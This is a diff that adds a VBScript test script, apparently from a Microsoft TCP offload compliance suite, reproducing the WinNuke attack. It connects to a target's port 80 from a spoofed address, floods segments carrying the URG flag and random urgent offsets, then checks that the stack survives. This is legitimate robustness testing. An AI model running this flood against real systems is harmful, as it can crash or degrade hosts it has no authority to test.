@@ -1,0 +1,202 @@
+'/**
+'
+' A script to send packets with random urgent offsets and URG flag
+'
+' Notes:
+' - Ensure that HTTP server is running on the remote machine
+' - Monitor the CPU usage during the attack
+' - Monitor the memory usage after the attack
+'
+' @module TCPWinnuke.wsf
+' @author Sandeep Prabhu
+' @alias sandeep@microsoft.com
+' @date 07/22/2002
+'
+'*/
+
+
+<package>
+   <job id="Job 1">
+      <reference id="Sparta" object="Spartacom.base.1" version="1.0"/>
+      <reference id="Core" object="Testcore.base.1" version="1.0"/>
+      <reference id="AutoSrv" object="AutoSrvCom.base.1" version="1.0"/>
+      <script language="VBScript" src="..\common\InitAddress.vbs"/>
+      <script language="VBScript" src="..\common\Common.Lib"/>
+      <script language="VBScript" src="..\common\TCPHelper.Lib"/>
+      <script id="Attack_TCPWinnuke" language="VBScript">
+
+
+option explicit
+
+dim Core, Sparta, Autosrv, pController, MediaType, IFace, ExceptionStatus
+
+StartScript "TCPWinnuke", g_szLogDirectory, "Test for launching winnuke attack"
+
+sub Main
+   Core.SetAssertionTracking "10300"
+   '/**
+   ' @area name="Offload Compliance Test Assertions"
+   ' @group name="TCP Vulnerabilities and Attacks Assertions"
+   ' @group name="TCP Response to WinNuke Attack Assertions" 
+   ' @define name="Offload" Offload Compliance Test Assertions
+   ' @define name="Attacks" TCP Vulnerabilities and Attacks Assertions
+   ' @define name="Winnuke" TCP Response to WinNuke Attack Assertions
+   ' @hierarchy Offload Attacks Winnuke
+   ' @key Reference="WLP# - x.x.x.x; RFC-793 Section 3.1; RFC-1122 Section 4.2.2.4"
+   ' @key TestDesc="TD-x.xx Offload Compliance Test Description"
+   ' @key TestName="TCP Response to WinNuke Attack Tests"
+   ' @key TestParam="-v6: uses IPv6 transport [default is IPv4]; -d duration: runs tests for duration seconds [default is 180 seconds]"
+   ' @key TestLog="TCPWinnuke.log"
+   '*/
+   dim ValueArray, ulStatus
+   ValueArray = Array(false, 180, false, false, false, false)
+   ParseArguments array("-v6", "-d", "-offload", "-nocap", "-popup", "-autosrv"), array(vbBoolean, vbLong, vbBoolean, vbBoolean, vbBoolean, vbBoolean), ValueArray
+
+   '/**
+   ' @config conf="An HTTP server must be running on port 80 of the stack being tested."
+   ' @test name="The stack must properly process packets with urgent data."
+   '    The test is an imitation and an extension of the WinNuke attack.
+   '    A TCP connection is established on port 80. Then, data segments
+   '    with the URG bit set and random urgent offsets are sent to the
+   '    stack for the duration of the test.
+   '*/
+   if (ShouldExecuteTest("DuplicateSegments")) then
+      StartTest "Launch winnuke attack"
+      Winnuke ValueArray(0), ValueArray(1), ValueArray(5)
+      EndTest
+   end if
+
+end sub
+
+'
+'/**
+' Keep sending data packets with URG flag and random urgent offsets. Send a
+' data packet without the URG flag set and ensure stack accepts the packet'
+'
+' @params
+' !fVersion6      - true/false depending on whether TCPv6/TCPv4
+' !ulDuration     - Duration of run in secs
+'
+' @returns  nothing
+'
+' */
+'
+sub Winnuke(fVersion6, ulDuration, fAutosrv)
+   dim szSrcAddress, szDestAddress, usSrcPort, usDestPort, ulSeqNumber, ulAckNumber
+   dim ulSessionId, ulBytesRcvd, pPacket, ulStatus, pIFace, pAutoDisc, ulCounter
+   dim pSYNPacket, StartTime
+
+   randomize
+   usSrcPort = clng(60534*rnd)+5000
+   if fAutosrv then
+       usDestPort = clng(60534*rnd)+5000
+   else
+       usDestPort = 80
+   end if
+
+   StartVariation
+
+   '
+   ' Start off auto discovery and create the interfaces
+   '
+   if (fVersion6) then
+      szSrcAddress = g_szLocalSpoofIp6Address
+      szDestAddress = g_szRemoteIp6Address
+      set pAutoDisc = sparta.AutoNeighbor(g_szLocalMacAddress, g_szLocalMacAddress, szSrcAddress, FALSE)
+   else
+      szSrcAddress = g_szLocalSpoofIp
+      szDestAddress = g_szRemoteIpAddress
+      set pAutoDisc = sparta.AutoArp(g_szLocalMacAddress, g_szLocalMacAddress, szSrcAddress)
+   end if
+   set pIFace = CreateInterface(fVersion6, TRUE, g_szRemoteMacAddress, g_szLocalMacAddress, szDestAddress, szSrcAddress)
+   pIFace.StartListening
+
+   if fAutosrv then
+       ulStatus = PassiveConnect(fVersion6, usSrcPort, usDestPort, szSrcAddress, szDestAddress, ulSeqNumber, ulAckNumber, ulSessionId, pIFace)
+       if (ulStatus <> 0) then
+          Sev1 "Winnuke: Failed to connect to " & usDestPort & " using src port - " & usSrcPort
+          Exit Sub
+       end if
+   else
+       '
+       ' Send a SYN to HTTP port
+       '
+       set pPacket = MakeTCPPacket(fVersion6, usSrcPort, usDestPort, szSrcAddress, szDestAddress, ulSeqNumber, ulAckNumber, TCP_SYN, 0)
+       pPacket.TcpHeader.TcpOption(0).AddMSS(EthernetMss(fVersion6))
+       pIFace.Send(pPacket)
+
+       '
+       ' Grab a SYN-ACK
+       '
+       set pPacket = RecvTCPPkt(ulSeqNumber, ulAckNumber, ulBytesRcvd, TCP_SYN or TCP_ACK, 300, pIFace)
+       if (pPacket is nothing) then
+          Sev1 "Winnuke: Failed to connect to " & usDestPort & " using src port - " & usSrcPort
+          exit sub
+       end if
+
+       '
+       ' Send an ACK
+       '
+       set pPacket = MakeTCPPacket(fVersion6, usSrcPort, usDestPort, szSrcAddress, szDestAddress, ulSeqNumber, ulAckNumber, TCP_ACK, 0)
+       pIFace.Send(pPacket)
+
+   end if
+
+   '
+   ' Check if connection is offloaded
+   '
+   If Not IsConnectionOffloaded(fVersion6, usSrcPort, usDestPort, szSrcAddress, szDestAddress, ulSessionId) and g_fTestOffload And g_fTOENic Then
+      Sev1 "Winnuke : Failed to offload the connection"
+      ResetConnection fVersion6, usSrcPort, usDestPort, szSrcAddress, szDestAddress, ulSeqNumber, ulAckNumber, ulSessionId, pIFace
+      Exit Sub
+   End If
+
+   '
+   ' Send OOB data with random urgent offsets
+   '
+   pIFace.StopListening
+   set pPacket = MakeTCPPacket(fVersion6, usSrcPort, usDestPort, szSrcAddress, szDestAddress, ulSeqNumber, ulAckNumber, TCP_ACK or TCP_URG, 600)
+   StartTime = Timer
+   do
+      pPacket.TCPHeader.UrgentPointer = Clng(60535*Rnd)
+      pIFace.Send(pPacket)
+   loop while ((Timer - StartTime) <= ulDuration)
+
+   '
+   ' Urgent data is not handled by TOE nic
+   ' Check if connection is uploaded
+   '
+   If IsConnectionOffloaded(fVersion6, usSrcPort, usDestPort, szSrcAddress, szDestAddress, ulSessionId) and g_fTestOffload And g_fTOENic Then
+      Sev1 "ResetConnection : Failed to upload the connection"
+      ResetConnection fVersion6, usSrcPort, usDestPort, szSrcAddress, szDestAddress, ulSeqNumber, ulAckNumber, ulSessionId, pIFace
+      Exit Sub
+   End If
+
+   '
+   ' Send a data packet
+   '
+   pIFace.StartListening
+   set pPacket = MakeTCPPacket(fVersion6, usSrcPort, usDestPort, szSrcAddress, szDestAddress, ulSeqNumber, ulAckNumber, TCP_ACK or TCP_PUSH, 100)
+   pIFace.Send(pPacket)
+
+   '
+   ' Get an ACK back
+   '
+   set pPacket = RecvTCPPkt(ulSeqNumber, ulAckNumber, ulBytesRcvd, TCP_ACK, 300, pIFace)
+   if (pPacket is nothing) then
+      Sev1 "Winnuke: Failed to receive ACK for data"
+   end if
+
+   '
+   ' Reset the connection
+   '
+   'set pPacket = MakeTCPPacket(fVersion6, usSrcPort, usDestPort, szSrcAddress, szDestAddress, ulSeqNumber, ulAckNumber, TCP_RST, 0)
+   'pIFace.Send(pPacket)
+
+   ResetConnection fVersion6, usSrcPort, usDestPort, szSrcAddress, szDestAddress, ulSeqNumber, ulAckNumber, ulSessionId, pIFace
+
+end sub
+
+      </script>
+   </job>
+</package>
